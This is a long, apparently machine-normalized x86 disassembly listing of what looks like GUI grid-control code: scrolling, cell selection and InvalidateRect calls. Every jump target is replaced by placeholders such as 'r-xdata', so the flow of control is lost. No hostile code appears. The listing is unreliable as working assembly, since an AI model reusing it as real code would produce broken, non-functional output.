add eax 0x250
call sub_46a750
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_46de6c
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_46dde4
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_46d79c
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_46e7ac
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_403540
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_449088
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_46c800
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_46ce40
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_46ce40
pop ecx
sub_46d054
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_46c800
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push sub_46d0ee
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_46ceac
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d12c
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_46c800
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_46ca38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_46e300
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_46d1f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d52c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d326
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_41d7bc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_41d7a0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d7ec
xor eax eax
push ebp
push sub_46d309
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_41de78
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41de18
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41de78
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_41de18
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41de78
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41de18
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d310
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41e140
retn
sub_46d334
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d52c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d4b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_46d498
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_41d7bc
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_41d7a0
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_41d7ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_46b610
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46b610
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d49f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41e140
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_41de78
mov eax [ ebp - 0x4 ]
call sub_441f54
mov edx eax
mov ecx esi
mov eax ebx
call sub_41de18
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41de78
mov eax [ ebp - 0x4 ]
call sub_441f98
mov ecx eax
mov edx esi
mov eax ebx
call sub_41de18
sub_46d4c4
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_46de6c
mov eax esi
call sub_46fea0
mov eax esi
mov si 0xffeb
call sub_403540
pop esi
pop ebp
retn 0x4
sub_46d4f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_46d54c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_46d4f0
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_46d4f0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_46d4f0
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402d44
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_46d628
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402d44
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_46c800
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_46d54c
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_46d54c
pop ecx
mov eax [ ebx + 0x208 ]
call sub_41df60
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_441f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_441f54
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_46d718
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_46d778
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_46d7a4
add esp 0x10
pop esi
retn
sub_46d7a4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_449088
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46d628
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_448d84
push eax
call InvalidateRect
sub_46d7ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_46d814
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_46d830
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46ca38
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_46d890
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46c800
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_46d8e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_46d904 ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46d830
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46d890
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46d814
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46d7ec
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_46d814
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_46d7ec
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_46d7ec
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_46d814
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_46d7ec
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_46d814
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_46da1c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46f874
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_441f54
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_46da6f ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41e070
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41e070
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_46e254
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402d44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_46d7a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46e400
mov eax [ ebp + 0x8 ]
push eax
call sub_46d814
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_46dbc8
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_46c800
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_46ca38
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_46d8e4
pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_46d8e4
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_46da1c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_4248ec
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_4248f4
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4248ec
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_4248f4
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_46dfc4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46f894
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46f874
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_46ddb0
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_46dde4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_46de6c
mov edx esp
mov eax ebx
call sub_46f8b4
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_46d12c
mov edx esp
mov eax ebx
call sub_46e030
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_46de6c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dfb1
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x20 ]
call sub_46a354
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dfb8
lea eax [ ebp - 0x20 ]
call sub_404094
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_46f8b4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_46b720
